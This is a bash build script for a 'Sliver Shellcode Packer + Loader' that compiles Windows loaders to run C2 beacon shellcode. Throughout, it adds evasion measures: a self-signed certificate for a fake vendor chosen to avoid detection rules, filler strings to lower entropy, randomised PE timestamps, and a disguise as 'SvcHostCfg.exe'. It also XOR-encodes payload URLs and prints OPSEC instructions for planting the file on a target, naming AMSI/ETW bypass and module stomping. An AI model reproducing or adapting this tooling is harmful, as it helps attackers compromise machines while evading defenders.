#!/bin/bash
# compile loader or pack shellcode
# ./build.sh loader | standalone <sc.bin> | pack <sc.bin> | encode <url>

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CERT_DIR="$SCRIPT_DIR/.certs"
# arch: --arch 32 or 64

ARCH="64"
ARGS=()
for arg in "$@"; do
    if [ "$arg" = "--arch" ]; then
        ARCH_NEXT=1
        continue
    fi
    if [ -n "$ARCH_NEXT" ]; then
        ARCH="$arg"
        unset ARCH_NEXT
        continue
    fi
    ARGS+=("$arg")
done
set -- "${ARGS[@]}"

if [ "$ARCH" = "32" ]; then
    CC="i686-w64-mingw32-gcc"
    WINDRES="i686-w64-mingw32-windres"
    MINGW_LIBDIR="/usr/i686-w64-mingw32/lib"
    MINGW_INCDIR="/usr/i686-w64-mingw32/include"
    ARCH_SUFFIX="_x86"
    ARCH_LABEL="x86 (32-bit)"
    MANIFEST_ARCH="x86"
    MINGW_PKG="gcc-mingw-w64-i686"
    ZLIB_PKG="libz-mingw-w64-dev"
else
    CC="x86_64-w64-mingw32-gcc"
    WINDRES="x86_64-w64-mingw32-windres"
    MINGW_LIBDIR="/usr/x86_64-w64-mingw32/lib"
    MINGW_INCDIR="/usr/x86_64-w64-mingw32/include"
    ARCH_SUFFIX=""
    ARCH_LABEL="x64 (64-bit)"
    MANIFEST_ARCH="amd64"
    MINGW_PKG="gcc-mingw-w64-x86-64"
    ZLIB_PKG="libz-mingw-w64-dev"
fi
# code signing

ensure_signing_cert() {
    if [ -f "$CERT_DIR/sign.pfx" ]; then
        return 0
    fi

    echo "Generating code signing certificate..."
    mkdir -p "$CERT_DIR"

    # Install osslsigncode if missing
    command -v osslsigncode &>/dev/null || {
        echo "Installing osslsigncode..."
        sudo apt-get install -y osslsigncode
    }

    # Generate self-signed code signing cert
    # CN mimics a plausible software vendor (NOT Microsoft — that triggers
    # different Elastic rules for impersonation)
    openssl req -x509 -newkey rsa:2048 \
        -keyout "$CERT_DIR/key.pem" \
        -out "$CERT_DIR/cert.pem" \
        -days 730 -nodes \
        -subj "/CN=Contoso Software Inc./O=Contoso Ltd./L=Redmond/ST=WA/C=US" \
        2>/dev/null

    # Convert to PFX for osslsigncode
    openssl pkcs12 -export \
        -out "$CERT_DIR/sign.pfx" \
        -inkey "$CERT_DIR/key.pem" \
        -in "$CERT_DIR/cert.pem" \
        -passout pass: \
        2>/dev/null

    echo "Signing cert generated at $CERT_DIR/"
}

sign_pe() {
    local infile="$1"
    local outfile="$2"

    osslsigncode sign \
        -pkcs12 "$CERT_DIR/sign.pfx" \
        -pass "" \
        -n "Windows Service Host Configuration" \
        -i "https://www.contoso.com" \
        -t "http://timestamp.digicert.com" \
        -in "$infile" \
        -out "$outfile" \
        2>/dev/null

    if [ $? -eq 0 ]; then
        mv "$outfile" "$infile"
        echo "Signed: $(basename "$infile")"
    else
        echo "note: Signing failed (non-fatal), using unsigned binary"
        rm -f "$outfile"
    fi
}
# entropy resource


# ~5.5 (normal for apps with string resources).

generate_entropy_resource() {
    local rc_file="$SCRIPT_DIR/resource.rc"

    cat > "$rc_file" << RCEOF
#include <winver.h>

1 VERSIONINFO
FILEVERSION     10,0,22621,1
PRODUCTVERSION  10,0,22621,1
FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
FILEFLAGS       0x0
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
FILESUBTYPE     VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName",      "Contoso Software Inc."
            VALUE "FileDescription",  "Windows Service Host Configuration"
            VALUE "FileVersion",      "10.0.22621.1 (WinBuild.160101.0800)"
            VALUE "InternalName",     "SvcHostCfg.exe"
            VALUE "LegalCopyright",   "\251 Contoso Software Inc. All rights reserved."
            VALUE "OriginalFilename", "SvcHostCfg.exe"
            VALUE "ProductName",      "Contoso Service Manager"
            VALUE "ProductVersion",   "10.0.22621.1"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 0x04B0
    END
END

1 24 {
"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>"
"<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
"  <assemblyIdentity version=""10.0.22621.1"" processorArchitecture=""${MANIFEST_ARCH}"" name=""Contoso.Windows.SvcHostCfg"" type=""win32""/>"
"  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v3"">"
"    <security>"
"      <requestedPrivileges>"
"        <requestedExecutionLevel level=""asInvoker"" uiAccess=""false""/>"
"      </requestedPrivileges>"
"    </security>"
"  </trustInfo>"
"  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">"
"    <application>"
"      <supportedOS Id=""{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}""/>"
"      <supportedOS Id=""{1f676c76-80e1-4239-95bb-83d0f6d0da78}""/>"
"      <supportedOS Id=""{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}""/>"
"      <supportedOS Id=""{35138b9a-5d96-4fbd-8e2d-a2440225f93a}""/>"
"      <supportedOS Id=""{e2011457-1546-43c5-a5fe-008deee3d3f0}""/>"
"    </application>"
"  </compatibility>"
"</assembly>"
}
RCEOF

    # Generate ~64KB of English text as STRINGTABLE entries
    # This dilutes entropy — real apps have tons of strings
    python3 -c "
import random, string
# Generate plausible UI strings (error messages, menu items, tooltips)
msgs = [
    'The operation completed successfully.',
    'Unable to connect to the specified server. Please check your network settings and try again.',
    'Configuration file has been updated. Restart the service to apply changes.',
    'Warning: The selected option may affect system performance.',
    'Please enter a valid username and password to continue.',
    'The service is currently running. Stop the service before making changes.',
    'File not found. The specified path does not exist or access is denied.',
    'Initializing system components. Please wait...',
    'The connection was reset by the remote host.',
    'Successfully saved configuration to the registry.',
    'An unexpected error occurred. Please contact your system administrator.',
    'Loading module dependencies...',
    'The specified port is already in use by another application.',
    'Authentication failed. The credentials provided are not valid.',
    'The operation timed out. The server did not respond within the expected time.',
    'Checking for available updates...',
    'The disk space on the selected drive is insufficient.',
    'Network adapter configuration has been changed.',
    'The certificate chain is not valid. Verify the certificate authority.',
    'Service started successfully on port %d.',
    'Shutting down background processes...',
    'The database connection pool has been exhausted.',
    'Retry attempt %d of %d...',
    'Memory allocation failed. The system may be low on resources.',
    'The specified user does not have permission to perform this action.',
    'Backup completed. %d files archived successfully.',
    'Restoring previous configuration from backup...',
    'The requested feature is not supported on this platform.',
    'Synchronizing data with remote server...',
    'Task scheduler: next run at %s.',
    'Validating input parameters...',
    'The log file has reached maximum size and will be rotated.',
    'DNS resolution failed for the specified hostname.',
    'Proxy settings detected. Using system proxy configuration.',
    'The application requires elevated privileges to continue.',
    'Cache cleared. %d entries removed.',
    'Monitoring system health metrics...',
    'The installed version is up to date.',
    'Generating diagnostic report...',
    'Thread pool initialized with %d worker threads.',
]

# Generate enough STRINGTABLE entries to hit ~64KB of string data
print('STRINGTABLE')
print('BEGIN')
sid = 100
for i in range(800):
    msg = msgs[i % len(msgs)]
    # Vary messages slightly to avoid repetition in entropy analysis
    if i > len(msgs):
        msg = msg.rstrip('.') + ' (code: 0x%04X).' % (i * 7 + 0x1000)
    print(f'    {sid}, \"{msg}\"')
    sid += 1
print('END')
" >> "$rc_file"

    $WINDRES "$rc_file" "$SCRIPT_DIR/resource.o" 2>/dev/null
    echo "Resource compiled (VersionInfo + manifest + ~64KB string table)"
}

build_loader() {
    echo "Building loader:"

    for pkg in $MINGW_PKG $ZLIB_PKG; do
        dpkg -s "$pkg" &>/dev/null || {
            echo "Installing $pkg..."
            sudo apt-get install -y "$pkg"
        }
    done

    # Ensure signing cert exists
    ensure_signing_cert

    CFLAGS="-O2 -s -I${MINGW_INCDIR}"
    LIBS="${MINGW_LIBDIR}/libz.a -lbcrypt -lwinhttp"

    # Generate resource with entropy dilution
    generate_entropy_resource

    local OUT_LOADER="$SCRIPT_DIR/loader${ARCH_SUFFIX}.exe"
    local OUT_LOADER_DBG="$SCRIPT_DIR/loader${ARCH_SUFFIX}_debug.exe"

    # Prod (silent)
    $CC $CFLAGS \
        "$SCRIPT_DIR/loader.c" "$SCRIPT_DIR/resource.o" \
        -o "$OUT_LOADER" \
        $LIBS

    # Debug (verbose)
    $CC $CFLAGS -DDEBUG \
        "$SCRIPT_DIR/loader.c" "$SCRIPT_DIR/resource.o" \
        -o "$OUT_LOADER_DBG" \
        $LIBS

    rm -f "$SCRIPT_DIR/resource.rc" "$SCRIPT_DIR/resource.o"

    # Set plausible PE timestamp (zero = ML flag)
    python3 -c "
import struct, sys, random, time
ts = int(time.time()) - random.randint(0, 180*86400)
for f in sys.argv[1:]:
    d = bytearray(open(f,'rb').read())
    pe_off = struct.unpack_from('<I', d, 0x3C)[0]
    struct.pack_into('<I', d, pe_off + 8, ts)
    open(f,'wb').write(d)
" "$OUT_LOADER" "$OUT_LOADER_DBG" 2>/dev/null

    # Sign both binaries
    sign_pe "$OUT_LOADER" "${OUT_LOADER%.exe}_signed.exe"
    sign_pe "$OUT_LOADER_DBG" "${OUT_LOADER_DBG%.exe}_signed.exe"

    echo ""
    echo "Built: $OUT_LOADER ($(du -h "$OUT_LOADER" | cut -f1)) [silent, signed, $ARCH_LABEL]"
    echo "Built: $OUT_LOADER_DBG ($(du -h "$OUT_LOADER_DBG" | cut -f1)) [verbose, signed, $ARCH_LABEL]"
    echo "Static zlib, no external DLL deps"
    echo "Techniques: indirect syscalls, module stomping, HW bp AMSI/ETW, entropy dilution, code signed"
    echo ""
    echo "Usage:"
    echo "    1. ./build.sh pack <shellcode.bin>  (generates english.lang + robots.txt)"
    echo "    2. cd output_dir && python3 -m http.server 80"
    echo "    3. On target: SvcHostCfg.exe <encoded_url>"
    echo ""
    echo "note: OPSEC REMINDERS:"
    echo "    - Rename to SvcHostCfg.exe on target (matches PE OriginalFilename)"
    echo "    - Drop to %APPDATA%\\Microsoft\\ or %LOCALAPPDATA%\\Temp\\"
    echo "    - Do NOT use C:\\Windows\\Tasks\\ or single-char names"
    echo "    - Do NOT deliver via powershell spawned from browser"
}

pack_shellcode() {
    if [ -z "$1" ]; then
        echo "Usage: $0 pack <shellcode.bin> [-u http://IP]"
        exit 1
    fi
    echo "Packing shellcode:"
    pip install pycryptodome -q 2>/dev/null || true
    shift_args=("${@}")
    python3 "$SCRIPT_DIR/pack.py" "${shift_args[@]}"
}

encode_url() {
    if [ -z "$1" ]; then
        echo "Usage: $0 encode http://IP[:PORT]"
        exit 1
    fi
    python3 -c "
import sys
KEY = bytes.fromhex('eaf8d435c6af16d8ae15383362cb21e6c527d8f624122ea0937334d6b574b2ba')
url = sys.argv[1].rstrip('/')
enc = bytes([ord(c) ^ KEY[i % len(KEY)] for i, c in enumerate(url)]).hex()
print(f'SvcHostCfg.exe {enc}')
print(f'    Decodes to: {url}')
" "$1"
}

build_standalone() {
    if [ -z "$1" ]; then
        echo "Usage: $0 standalone <shellcode.bin>"
        exit 1
    fi
    local SC_FILE="$1"
    echo "Building standalone loader:"

    for pkg in $MINGW_PKG $ZLIB_PKG; do
        dpkg -s "$pkg" &>/dev/null || {
            echo "Installing $pkg..."
            sudo apt-get install -y "$pkg"
        }
    done

    ensure_signing_cert
    pip install pycryptodome -q 2>/dev/null || true

    # Generate embedded payload header
    echo "Embedding payload..."
    python3 "$SCRIPT_DIR/embed.py" "$SC_FILE" -o "$SCRIPT_DIR/embedded_payload.h"

    # Generate resource with entropy dilution
    generate_entropy_resource

    CFLAGS="-O2 -s -I${MINGW_INCDIR}"
    LIBS="${MINGW_LIBDIR}/libz.a -lbcrypt"

    local OUT_SA="$SCRIPT_DIR/standalone${ARCH_SUFFIX}.exe"
    local OUT_SA_DBG="$SCRIPT_DIR/standalone${ARCH_SUFFIX}_debug.exe"

    # Prod
    $CC $CFLAGS \
        "$SCRIPT_DIR/loader_standalone.c" "$SCRIPT_DIR/resource.o" \
        -o "$OUT_SA" \
        $LIBS

    # Debug
    $CC $CFLAGS -DDEBUG \
        "$SCRIPT_DIR/loader_standalone.c" "$SCRIPT_DIR/resource.o" \
        -o "$OUT_SA_DBG" \
        $LIBS

    rm -f "$SCRIPT_DIR/resource.rc" "$SCRIPT_DIR/resource.o" "$SCRIPT_DIR/embedded_payload.h"

    # Plausible timestamp
    python3 -c "
import struct, sys, random, time
ts = int(time.time()) - random.randint(0, 180*86400)
for f in sys.argv[1:]:
    d = bytearray(open(f,'rb').read())
    pe_off = struct.unpack_from('<I', d, 0x3C)[0]
    struct.pack_into('<I', d, pe_off + 8, ts)
    open(f,'wb').write(d)
" "$OUT_SA" "$OUT_SA_DBG" 2>/dev/null

    # Sign
    sign_pe "$OUT_SA" "${OUT_SA%.exe}_signed.exe"
    sign_pe "$OUT_SA_DBG" "${OUT_SA_DBG%.exe}_signed.exe"

    echo ""
    echo "Built: $OUT_SA ($(du -h "$OUT_SA" | cut -f1)) [silent, signed, $ARCH_LABEL]"
    echo "Built: $OUT_SA_DBG ($(du -h "$OUT_SA_DBG" | cut -f1)) [verbose, signed, $ARCH_LABEL]"
    echo "No args needed — payload embedded"
    echo ""
    echo "Usage on target:"
    echo "    SvcHostCfg.exe     (no arguments, no HTTP server needed)"
    echo ""
    echo "note: OPSEC: rename to SvcHostCfg.exe, drop to %APPDATA%\\Microsoft\\"
}

case "${1:-}" in
    loader)
        build_loader
        ;;
    standalone)
        shift
        build_standalone "$@"
        ;;
    pack)
        shift
        pack_shellcode "$@"
        ;;
    encode)
        encode_url "$2"
        ;;
    all)
        shift
        pack_shellcode "$@"
        echo ""
        build_loader
        ;;
    *)
        echo "Sliver Shellcode Packer + Loader"
        echo ""
        echo "Usage:"
        echo "  $0 loader                        Build network loader (needs HTTP server)"
        echo "  $0 standalone <shellcode.bin>     Build standalone loader (payload embedded)"
        echo "  $0 pack <file.bin> [-u URL]       Pack shellcode + encode URL"
        echo "  $0 encode http://IP[:PORT]        Encode URL only"
        echo "  $0 all <file.bin> [-u URL]        Pack + build network loader"
        echo ""
        echo "Standalone workflow (no HTTP server needed):"
        echo "  1. sliver> generate beacon --format shellcode --save beacon.bin"
        echo "  2. $0 standalone beacon.bin   -> standalone.exe (self-contained)"
        echo "  3. On target: SvcHostCfg.exe  (no args)"
        echo ""
        echo "Network workflow (needs HTTP server):"
        echo "  1. $0 pack beacon.bin         -> english.lang + robots.txt"
        echo "  2. python3 -m http.server 80"
        echo "  3. On target: SvcHostCfg.exe <encoded_url>"
        echo ""
        echo "Techniques: module stomping, indirect syscalls, HW bp AMSI/ETW,"
        echo "            entropy dilution, code signing, header stomp"
        ;;
esac
